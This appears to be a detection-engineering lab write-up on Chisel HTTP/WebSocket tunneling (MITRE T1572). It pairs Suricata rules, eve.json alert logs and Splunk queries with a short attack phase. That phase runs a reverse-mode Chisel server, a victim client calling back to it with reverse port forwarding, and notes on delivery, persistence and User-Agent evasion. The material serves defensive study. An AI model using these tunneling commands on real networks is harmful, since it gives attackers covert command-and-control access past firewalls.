###  T1572 — HTTP/WebSocket Tunneling Detection (chisel)
Protocol Tunneling involves encapsulating malicious traffic within standard, non-malicious network protocols to bypass defensive network controls and firewalls. This detection scenario specifically focuses on Chisel, a popular fast TCP/UDP tunnel transport tool that operates over HTTP and uses WebSockets for secure, persistent, and bidirectional communication.

Since HTTP/HTTPS traffic is generally permitted in almost all enterprise environments, attackers leverage Chisel to mask their Command and Control (C2) communication or lateral movement activities inside legitimate-looking web traffic.

How the Attack Works & What the Log Explains:

    Initial Connection: The client (compromised internal host) initiates a standard HTTP GET request to the external Chisel server.

    Protocol Upgrade (Status 101): The client requests a protocol switch from standard HTTP to WebSocket (Switching Protocols).

    Established Tunnel: Once the handshake is successful, a persistent WebSocket tunnel is established. The attacker can now tunnel arbitrary TCP/UDP traffic (like SSH, RDP, or SMB) through this single, open HTTP connection without triggering standard port-blocking rules.


# A. Attack Phase
Note on Real-World Applicability: In a realistic cyberattack scenario, a victim would obviously not manually execute a Chisel client command to invite an attacker. Instead, this command is executed by the attacker after gaining initial access to the target system.

Typical real-world delivery methods for this client-side command include:

    Malicious Word/Excel Macros (Phishing): A weaponized document drops the chisel.exe binary into a hidden folder (e.g., AppData) and executes the command silently in the background via PowerShell.

    Post-Exploiation Frameworks: The attacker exploits an unpatched vulnerability (like a web server RCE), gains a reverse shell, and uploads Chisel to initiate Lateral Movement or establish a persistent C2 channel.

    Scheduled Tasks / Persistence: The command is registered as a hidden Windows Service or Scheduled Task to ensure the tunnel reconnects even if the system reboots.


Step 1: Setting up the C2 Server (Attacker - Kali Linux)

The attacker starts a Chisel server listening on port 8080, configured to allow reverse port forwarding:

```
chisel server -p 8080 --reverse
```

Step 2: Executing the Implant (Victim - Windows Endpoint)

Once inside the Windows environment, the attacker triggers the Chisel client (either via an exploited process, a malicious script, or a compromised account) to call back to the C2 server and forward local traffic:

```
.\chisel.exe client 192.168.56.102:8080 R:9090:127.0.0.1:80
```

Step 3: Port Forwarding Verification & Exploitation (Attacker - Kali Linux)

Once the Chisel client successfully establishes the reverse WebSocket tunnel, the Windows machine's local port 80 (or the targeted internal service) becomes accessible directly through the attacker's own local port 9090.

To verify the tunnel is active and interact with the compromised internal environment, the attacker runs curl against their own localhost loopback:

```
curl -v http://127.0.0.1:9090

```

What Happens Behind the Scenes:

    The curl request hits the attacker's local port 9090.

    Chisel encapsulates this traffic and routes it through the pre-established WebSocket tunnel (over port 8080).

    The Chisel client on the Windows machine unpacks the request and forwards it locally to 127.0.0.1:80.

    The response travels back through the same encrypted/masked tunnel, completely bypassing traditional perimeter firewall rules.


# B. Suricata Rule Writing
This Suricata rule monitors established HTTP traffic directed towards a server, generating a major trojan-activity alert whenever it detects the default "Go-http-client/1.1" User-Agent string, which often indicates a potential Go-based C2 framework or automated tunnel tool signaling out.

```
alert http any any -> any any (msg:"HUNT Go-http-client UA - possible HTTP tunnel/C2"; flow:established,to_server; http.user_agent; content:"Go-http-client/1.1"; fast_pattern; metadata:attack_target Client_and_Server, signature_severity Major; sid:200003; rev:2; classtype:trojan-activity;)
```


# C. Post-Attack Suricata Log Verification Phase (sid:200003)
After simulating the attack, we inspect Suricata's primary log file, eve.json. The engine successfully triggers an alert, capturing the network footprint of the Chisel WebSocket tunnel.
Below is the detailed analysis of the key fields within the generated JSON log:

```
{
  "timestamp": "2026-06-21T15:33:19.232798+0300",
  "flow_id": 2117085654578445,
  "in_iface": "\\Device\\NPF_{A73CABAC-5A25-4549-88EE-FE81B84EF150}",
  "event_type": "alert",
  "src_ip": "192.168.56.1",
  "src_port": 32532,
  "dest_ip": "192.168.56.102",
  "dest_port": 8080,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "stream (detect/log)",
  "tx_id": 0,
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 200003,
    "rev": 2,
    "signature": "HUNT Go-http-client UA - possible HTTP tunnel/C2",
    "category": "A Network Trojan was detected",
    "severity": 1,
    "metadata": {
      "attack_target": [
        "Client_and_Server"
      ],
      "signature_severity": [
        "Major"
      ]
    }
  },
  "ts_progress": "request_complete",
  "tc_progress": "response_headers",
  "http": {
    "hostname": "192.168.56.102",
    "http_port": 8080,
    "url": "/",
    "http_user_agent": "Go-http-client/1.1",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 101,
    "length": 0
  },
  "app_proto": "http",
  "app_proto_expected": "websocket",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 4,
    "pkts_toclient": 3,
    "bytes_toserver": 481,
    "bytes_toclient": 309,
    "start": "2026-06-21T15:33:19.230778+0300",
    "src_ip": "192.168.56.1",
    "dest_ip": "192.168.56.102",
    "src_port": 32532,
    "dest_port": 8080
  }
}
```

Key Indicators & Technical Breakdown

    Suspicious User-Agent Identity (http_user_agent): The log captures "http_user_agent": "Go-http-client/1.1". Chisel is compiled in Go, and unless explicitly overridden by the attacker, it leaves this default string in the headers. This immediately flags the traffic as an automated tool or non-browser client rather than standard user activity.

    Protocol Upgrade & Discrepancy (status: 101): The HTTP response status is 101 Switching Protocols. This indicates that the initial cleartext HTTP connection is being upgraded to a persistent, full-duplex session.

    Protocol Mismatch Anomalies (app_proto vs app_proto_expected):
    Suricata's protocol parser reveals a critical indicator: "app_proto": "http" but "app_proto_expected": "websocket". This clear mismatch shows that while the connection started under the guise of standard web traffic, it transitioned into an active WebSocket tunnel, confirming a classic protocol encapsulation behavior used by C2 implants.

    Network Session Tracking (flow_id): The unique "flow_id": 2117085654578445 correlates all packets belonging to this specific tunnel. This ID is essential for blue teams to trace the duration, volume, and full context of the malicious session during incident response.


# D. Alerting Phase (React Dashboard + Telegram Bot)
Finally, we pass the generated alerts into our custom dashboard or a designated Telegram bot chat, converting them into real-time notifications for quicker visibility.

![Suricata Alert](../screenshots/http-tunneling-1.png?v=2)
![Suricata Alert](../screenshots/http-tunneling-2.jpg?v=2)


# E. Detection Engineering — Layered Approach
A single User-Agent match is the weakest possible detection: it relies on the attacker not changing one string. A production-grade detection treats the Chisel tunnel as a stack of signals, ordered from cheap-but-fragile to expensive-but-durable. Each layer survives the evasion that defeats the layer above it.

LayerSignalCost to evadeTelemetry1Go-http-client/1.1 User-AgentTrivial (one header)Suricata (http)2WebSocket upgrade + app_proto mismatchModerate (requires reconfiguring transport)Suricata (http / anomaly)3Long-lived flow + low-jitter beaconingHard (inherent to tunnel behavior)Suricata (flow) / SIEM

The original rule in Section B is Layer 1. The sections below add Layers 2 and 3.

Why this matters: Chisel wraps its payload in an SSH session, so the tunnel contents are encrypted and cannot be inspected. Detection therefore relies entirely on metadata that leaks in cleartext — the HTTP handshake (User-Agent, GET /, 101 Switching Protocols) and the shape of the flow (duration, volume, regularity). The deeper the layer, the more it depends on behavior the attacker cannot easily hide without breaking the tunnel.


# Layer 2 — Protocol Anomaly (WebSocket Upgrade)

The strongest cleartext indicator observed in the log was not the User-Agent — it was the protocol transition itself:

```
"status": 101,                       <- HTTP 101 Switching Protocols (server response)
"app_proto": "http",                 <- connection began as HTTP
"app_proto_expected": "websocket"    <- Suricata's parser saw it become a WebSocket
```

This app_proto vs app_proto_expected mismatch is Suricata explicitly telling us "this started as web traffic and turned into a persistent full-duplex channel." A browser fetching a page never does this on an internal service port. The handshake is detectable on the request side, before the server's 101 response:

```
alert http $HOME_NET any -> any any (msg:"HUNT WebSocket Upgrade Handshake - possible HTTP tunnel"; \
  flow:established,to_server; \
  http.method; content:"GET"; \
  http.header; content:"Upgrade|3a 20|websocket"; nocase; \
  http.header; content:"Connection|3a 20|Upgrade"; nocase; \
  metadata:signature_severity Major; sid:200004; rev:1; classtype:trojan-activity;)
```

# Post-Attack Suricata Log Verification Phase (sid:200004)
```
{
  "timestamp": "2026-06-21T19:15:39.296791+0300",
  "flow_id": 972038718657651,
  "in_iface": "\\Device\\NPF_{A73CABAC-5A25-4549-88EE-FE81B84EF150}",
  "event_type": "alert",
  "src_ip": "192.168.56.1",
  "src_port": 56381,
  "dest_ip": "192.168.56.102",
  "dest_port": 8080,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "stream (detect/log)",
  "tx_id": 0,
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 200004,
    "rev": 1,
    "signature": "HUNT WebSocket Upgrade Handshake - possible HTTP tunnel",
    "category": "A Network Trojan was detected",
    "severity": 1,
    "metadata": {
      "signature_severity": [
        "Major"
      ]
    }
  },
  "ts_progress": "request_complete",
  "tc_progress": "response_headers",
  "http": {
    "hostname": "192.168.56.102",
    "http_port": 8080,
    "url": "/",
    "http_user_agent": "Go-http-client/1.1",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 101,
    "length": 0
  },
  "app_proto": "http",
  "app_proto_expected": "websocket",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 4,
    "pkts_toclient": 3,
    "bytes_toserver": 481,
    "bytes_toclient": 309,
    "start": "2026-06-21T19:15:39.291856+0300",
    "src_ip": "192.168.56.1",
    "dest_ip": "192.168.56.102",
    "src_port": 56381,
    "dest_port": 8080
  }
}
```
1. Attacker Evasion Cost (Robustness)

    SID: 200003 (Fragile): This rule relies entirely on a static string match. An attacker can blind this detection in 5 seconds simply by passing a custom user-agent flag (e.g., --header "User-Agent: Mozilla/5.0...").

    SID: 200004 (Durable): This rule targets a structural necessity of the tool. No matter what User-Agent is spoofed, Chisel must send Upgrade: websocket and Connection: Upgrade headers to successfully establish the full-duplex tunnel. Evading this requires the attacker to abandon Chisel or completely reconfigure the underlying transport mechanism.

2. Threat Hunting & SIEM Fidelity

    SID: 200003 (High Noise): Merely indicates a generic Go-based application in the network. In production, this surfaces massive false positives from legitimate utilities like Docker, Terraform, or Kubernetes components.

    SID: 200004 (High Confidence): Directly signals protocol encapsulation (tunneling activity). As verified by Suricata's parser fields ("app_proto": "http" / "app_proto_expected": "websocket"), the rule catches the attacker red-handed during the initial handshake request, before the server even responds with HTTP 101.

Mobi/SOC Recommendation: Treat Layer 1 (200003) as a low-severity hunting lead, and elevate Layer 2 (200004) to a high-priority alert when observed on non-standard internal web ports (e.g., 8080, 9090).


Tuning note: Legitimate WebSocket traffic exists (chat apps, live dashboards), but it almost always runs over 443/TLS. A plaintext WS upgrade to a non-standard internal port (8080, 9090, etc.) is the anomalous case. Narrow false positives by pairing this rule with a non-web destination port, or by correlating the app_proto_expected:websocket field in the 


# SIEM:

```
index=main sourcetype=_json (event_type=alert OR event_type=http)
  app_proto=http app_proto_expected=websocket
| where dest_port!=443
| table _time src_ip dest_ip dest_port http.http_user_agent http.status
```
Splunk: 
![Splunk Search](../screenshots/http-tunneling-3.png?v=2)

Layer 3 — Flow Behavior (Long-Lived Channel + Beaconing)

This is the layer the attacker cannot remove without abandoning the tunnel. A tunnel is, by definition, a long-lived carrier channel — not a short request/response. The flow events captured during this lab showed two distinct behavioral fingerprints.

3a. Abnormally long-lived flow on a non-web port

```
bytes_toserver: 17421, bytes_toclient: 13951, age: 716   <- ~12 minutes, bidirectional KBs
bytes_toserver: 10303, bytes_toclient: 8479,  age: 311
bytes_toserver: 10002, bytes_toclient: 7863,  age: 291   (still established)
```

A normal HTTP transaction closes in seconds. A connection living for 716 seconds while moving tens of KB in both directions on port 8080 is a carrier channel, not a page load.

```
index=main sourcetype=_json event_type=flow
| where dest_port!=80 AND dest_port!=443 AND dest_port!=53
| spath flow.age output=age
| spath flow.bytes_toserver output=up
| spath flow.bytes_toclient output=down
| where age > 60 AND up > 1000 AND down > 1000
| table _time src_ip dest_ip dest_port age up down
| sort - age
```

Splunk:
![Splunk Search](../screenshots/http-tunneling-4.png?v=2)

3b. Low-jitter, identical-size beaconing

```
bytes_toserver: 330, bytes_toclient: 300, age: 2   <- this exact triplet repeated ~14 times

```

Near-zero jitter and constant payload size across many flows is the signature of automation (keep-alive / polling), not human activity. This is the same principle as classic C2 beacon detection (coefficient-of-variation / FFT on inter-arrival times), applied here at the flow-record level.

```
index=main sourcetype=_json event_type=flow
| stats count values(flow.age) as ages by src_ip dest_ip dest_port flow.bytes_toserver flow.bytes_toclient
| where count > 5
| sort - count
```
Splunk:
![Splunk Search](../screenshots/http-tunneling-5.png?v=2)

The 330/300 pair surfaces at the top of the count column — that constant-size repetition is the beacon.


Chaining the layers (optional, highest fidelity)

Any single layer produces noise. The high-confidence detection is the conjunction: a host that (1) presents a Go/automated client, (2) performs a WebSocket upgrade on a non-web port, and (3) sustains a long-lived or beaconing flow. In Suricata this can be expressed with flowbits — set a flag on the WebSocket upgrade, then alert only if the same flow later exceeds a duration/volume threshold — or assembled in the SIEM by correlating the three queries above on flow_id / src_ip + dest_port.